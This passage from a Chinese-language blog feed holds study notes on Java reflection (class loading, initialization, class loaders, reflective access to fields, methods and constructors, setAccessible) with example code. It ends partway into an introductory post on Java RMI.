class="hljs-number">41903949</span><br><br></code></pre></td></tr></table></figure><p>大小不同的数组，其实用的是同一个class</p><p>所以我们得出结论，只要元素维度一样，就是同一个class</p><h2 id="5、Java内存分析"><a href="#5、Java内存分析" class="headerlink" title="5、Java内存分析"></a>5、Java内存分析</h2><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301697.png" alt="image-20220930203511713"> </p><h3 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h3><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301786.png" alt="image-20220930203551658"> </p><h3 id="类的加载与ClassLoader的理解"><a href="#类的加载与ClassLoader的理解" class="headerlink" title="类的加载与ClassLoader的理解"></a>类的加载与ClassLoader的理解</h3><p>首先有三个区域</p><p>堆、栈、方法区（特殊的堆）</p><ul><li>加载：<ul><li>将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后生成一个代表这个类的java.lang.Class对象.</li></ul></li><li>链接：将Java类的二进制代码合并到JVM的运行状态之中的过程。<ul><li>验证：确保加载的类信息符合JVM规范，没有安全方面的问题</li><li>准备：正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。</li><li>解析：虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</li></ul></li><li>初始化<ul><li>执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。类构造器()方法是由编译期自动收集类中所有类<strong>变量的赋值动作和静态代码块中的语句合并产生的</strong>。（类构造器是构造类信息的，不是构造该类对象的构造器）。</li><li>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</li><li>虚拟机会保证一个类的()方法在多线程环境中被正确加锁和同步。</li></ul></li></ul><p>下面来看一个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test05</span> &#123;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;a类代码初始化&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">a</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;a的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在我们加载的时候把字节码加载到内存当中，就形成了这两个Java.lang.Class对象，在堆中这两个对象分别代表着方法区中的类</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301598.png" alt="image-20220930204410623"> </p><p>然后我们准备开始执行我们的main方法</p><p>正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。m的初始值为0，并且把符号替换为直接引用（由变量名）</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301292.png" alt="image-20220930204755428"> </p><p>然后我们new了一个对象a，这个对象a就代表Java.lang.Class里面的东西，从而指向a类的数据，也就拿到了a类的数据</p><p>之后执行<code>clinit()</code>方法，把所有静态代码块合并，于是得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">m</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">300</span><br><span class="hljs-attribute">m</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p><strong>总结步骤如下</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301603.png" alt="image-20220930205356851"> </p><h3 id="什么时候会发生类的初始化"><a href="#什么时候会发生类的初始化" class="headerlink" title="什么时候会发生类的初始化"></a>什么时候会发生类的初始化</h3><ul><li><h4 id="类的主动引用（一定会发生初始化）"><a href="#类的主动引用（一定会发生初始化）" class="headerlink" title="类的主动引用（一定会发生初始化）"></a>类的主动引用（一定会发生初始化）</h4><ul><li>当虚拟机启动，先初始化main方法所在的类</li><li>new一个类的对象</li><li>调用类的静态成员（除了fifinal常量）和静态方法</li><li>使用java.lang.reflflect包的方法对类进行反射调用</li><li>当初始化一个类，如果其父类没有被初始化，则先会初始化它的父类</li></ul></li></ul><p>示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.ServerError;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test05</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;main类被加载&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//主动引用</span><br>        Student s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;父类被加载&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;子类被加载&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br>父类被加载<br>子类被加载<br></code></pre></td></tr></table></figure><p>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>       <span class="hljs-comment">//主动引用</span><br>       <span class="hljs-comment">//Student s=new Student();</span><br>       <span class="hljs-comment">//反射也会产生主动引用</span><br>       Class.forName(<span class="hljs-string">&quot;Student&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>结果和上面一样</p><ul><li><h4 id="类的被动引用"><a href="#类的被动引用" class="headerlink" title="类的被动引用"></a>类的被动引用</h4><ul><li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如：当通过子类引用父类的静态变量，不会导致子类初始化</li><li>通过数组定义类引用，不会触发此类的初始化</li><li>引用常量不会触发此类的初始化（常量在链接阶段就存入调用类的常量池中了）</li></ul></li></ul><p>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//不会产生类的引用的方法</span><br>    System.out.println(Student.b);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br>父类被加载<br><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>发现没有被加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>       Student[] arra=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>[<span class="hljs-number">5</span>];<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br></code></pre></td></tr></table></figure><h3 id="类加载器作用"><a href="#类加载器作用" class="headerlink" title="类加载器作用"></a>类加载器作用</h3><ul><li>类加载的作用：将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口。</li><li>类缓存：标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301533.png" alt="image-20220930220818123"> </p><ul><li>类加载器作用是用来把类(class)装载进内存的。JVM 规范定义了如下类型的类的加载器</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301668.png" alt="image-20220930220859920"> </p><p>下面这一些代码检测了类加载器是由哪一些成分加载的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">systemClassLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br>        <span class="hljs-comment">//获取系统加载器的父类加载器-&gt;拓展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br>        <span class="hljs-comment">//获取拓展类加载器的父类加载器-&gt;根加载器（c/c++）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br>        <span class="hljs-comment">//测试当前类是哪一个类加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test&quot;</span>).getClassLoader();<br>        System.out.println(test);<br>        <span class="hljs-comment">//测试jdk内置的类是谁加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(test1);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>一个快捷键ctrl+alt+v</p><p>输出结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$AppClassLoader</span>@<span class="hljs-number">1</span>f89ab83<br>jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$PlatformClassLoader</span>@<span class="hljs-number">27</span>f674d<br>null<br>jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$AppClassLoader</span>@<span class="hljs-number">1</span>f89ab83<br>null<br></code></pre></td></tr></table></figure><h2 id="6、获取类运行时的完整结构"><a href="#6、获取类运行时的完整结构" class="headerlink" title="6、获取类运行时的完整结构"></a>6、获取类运行时的完整结构</h2><p>通过反射获取运行时类的完整结构</p><p>Field、Method、Constructor、Superclass、Interface、Annotation</p><p>作用如下</p><ul><li>实现全部的接口</li><li>找到所继承的父类</li><li>全部的构造器</li><li>全部的方法</li><li>全部的Field</li><li>注解</li></ul><p>示例代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">//获取类的名字</span><br>        System.out.println(test.getName());<span class="hljs-comment">//获取包名+类名</span><br>        System.out.println(test.getSimpleName());<span class="hljs-comment">//获取类名</span><br><br>        <span class="hljs-comment">//在Java反射中Field用于获取某个类的属性或该属性的属性值</span><br>        Field[] fields = test.getFields();<span class="hljs-comment">//只能找到public属性</span><br>        Field[] declaredFields = test.getDeclaredFields();<span class="hljs-comment">//能够找到全部的属性</span><br>        <span class="hljs-keyword">for</span>(Field field:declaredFields)&#123;<br>            System.out.println(field);<br>        &#125;<br><br>        <span class="hljs-comment">//获取类的方法</span><br>        Method[] methods = test.getMethods();<span class="hljs-comment">//获取本类以及父类的所有方法</span><br>        <span class="hljs-keyword">for</span>(Method method:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;正常的&quot;</span>+method);<br>        &#125;<br>        methods=test.getDeclaredMethods();<span class="hljs-comment">//获取本类的所有方法</span><br>        <span class="hljs-keyword">for</span>(Method method:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;getdeclaredmethod&quot;</span>+method);<br>        &#125;<br><br>        <span class="hljs-comment">//获得指定方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> test.getMethod(<span class="hljs-string">&quot;method&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> test.getMethod(<span class="hljs-string">&quot;method2&quot;</span>, <span class="hljs-type">char</span>.class);<br><br>        <span class="hljs-comment">//获得指定的构造器</span><br>        Constructor[] constructors = test.getConstructors();<span class="hljs-comment">//只获得public方法</span><br>        Constructor[] declaredConstructors = test.getDeclaredConstructors();<span class="hljs-comment">//可以获得本类的所有方法</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> test.getConstructor(<span class="hljs-type">char</span>.class, String.class, <span class="hljs-type">int</span>.class);<span class="hljs-comment">//获得指定的构造器</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="7、有了Class对象，我们能做什么"><a href="#7、有了Class对象，我们能做什么" class="headerlink" title="7、有了Class对象，我们能做什么"></a>7、有了Class对象，我们能做什么</h2><ul><li><p>创建类的对象：调用Class对象的newInstance()方法</p><ul><li>类必须有一个无参数的构造器。</li><li>类的构造器的访问权限需要足够</li></ul></li><li><p>思考？难道没有无参的构造器就不能创建对象了吗？只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作</p></li><li><p>步骤如下</p><ul><li>通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器</li><li>向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li><li>通过Constructor实例化对象</li></ul></li></ul><p><strong>下面是一些示例：</strong></p><p>对于不带参数的public类型的Class，我们可以直接对其创建实例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">String s = String.<span class="hljs-keyword">class</span>.<span class="hljs-title function_ invoke__">newInstance</span>();<br></code></pre></td></tr></table></figure><p>但对于带参数的Class，需要调用其带任意参数的构造方法，必须借助于Constructor对象</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Constructor cons1 = Child.<span class="hljs-keyword">class</span>.getConstructor(String.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>Child kid = (Child) cons1.newInstance(<span class="hljs-string">&quot;testName&quot;</span>,<span class="hljs-number">60</span>);<br>System.<span class="hljs-keyword">out</span>.println(kid.name);<br></code></pre></td></tr></table></figure><ol><li>首先获取该对象的构造方法</li><li>对该构造方法调用newInstance并传入特定参数，创建实例成功</li><li>Constructor有getConstructor(Class)、getDeclaredConstructor(Class)、getConstructors()、getDeclaredConstructors()，使用方法类似，不再赘述</li></ol><p><strong>调用指定的方法</strong></p><ul><li><p>通过反射，调用类中的方法，通过Method类完成</p><ul><li>通过Class类的getMethod(String name,Class…parameterTypes)方法取得一个Method对象，并设置此方法操作时所需要的参数类型。</li><li>之后使用Object invoke(Object obj, Object[] args)进行调用，并向方法中传递要设置的obj对象的参数信息。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301846.png" alt="image-20221002194905431"> </p><ul><li>Object 对应原方法的返回值，若原方法无返回值，此时返回null</li><li>若原方法若为静态方法，此时形参Object obj可为null</li><li>若原方法形参列表为空，则Object[] args为null</li><li>若原方法声明为private,则需要在调用此invoke()方法前，显式调用方法对象的setAccessible(true)方法，将可访问private的方法。</li></ul></li></ul><p>这是两段测试代码（不知道为什么直接打印一个类的时候会输出@什么东西）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//获取对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test01&quot;</span>);<br><br>        <span class="hljs-comment">//构造对象</span><br>        <span class="hljs-comment">//newInstance方法讲解</span><br>        <span class="hljs-comment">//类类和构造函数类的 newInstance（） 方法用于创建该类的新实例。</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (test01) c1.newInstance();<span class="hljs-comment">//本质上是调用无参构造器</span><br>        System.out.println(o.name);<br><br>        <span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class);<br>        <span class="hljs-type">test01</span> <span class="hljs-variable">newperson</span> <span class="hljs-operator">=</span> (test01) declaredConstructor.newInstance(<span class="hljs-string">&quot;lyj&quot;</span>);<br>        System.out.println(newperson.name);<br><br>        <span class="hljs-comment">//调用普通方法，没有办法直接调用，得先获取</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> (test01)c1.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<span class="hljs-comment">//先获取这个方法</span><br>        setName.invoke(o1,<span class="hljs-string">&quot;fuck&quot;</span>);<span class="hljs-comment">//通过invoke方法激活并修改值（对象，”方法的值“）</span><br>        System.out.println(o1.getName());<br><br>        <span class="hljs-comment">//通过反射操作属性</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> (test01)c1.newInstance();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.set(o2,<span class="hljs-string">&quot;fuzz&quot;</span>);<br>        System.out.println(o2.getName());<br><br>    &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test01</span>&#123;<br>    String name=<span class="hljs-string">&quot;ace&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test01</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test01</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        System.out.println(<span class="hljs-string">&quot;khasjdk&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="8、setAccessible"><a href="#8、setAccessible" class="headerlink" title="8、setAccessible"></a>8、setAccessible</h2><ul><li>Method和Field、Constructor对象都有setAccessible()方法。</li><li>setAccessible作用是启动和禁用访问安全检查的开关。</li><li>参数值为true则指示反射的对象在使用时应该取消Java语言访问检查。</li><li>提高反射的效率。如果代码中必须用反射，而该句代码需要频繁的被调用，那么请设置为true。</li><li>使得原本无法访问的私有成员也可以访问</li><li>参数值为false则指示反射的对象应该实施Java语言访问检查</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/Decemberus.github-io/2022/10/30/RMI/"/>
    <url>/Decemberus.github-io/2022/10/30/RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="一些基本知识"><a href="#一些基本知识" class="headerlink" title="一些基本知识"></a>一些基本知识</h2><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独有的⼀种机制。<code>RMI</code>用于构建分布式应用程序，<code>RMI</code>实现了<code>Java</code>程序之间跨<code>JVM</code>的远程通信。</p><p>RMIServer分为三部分</p><ul><li>继承了java.rmi.Remote的接口，其中定义要远程调用的函数，比如这里的<code>hello()</code></li><li>一个实现了接口的类</li><li>一个主类，用来创建Registry，并且把上面的类实例化以后绑定到一个地址，就是所谓的Server了</li></ul><p><strong>RMIServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title 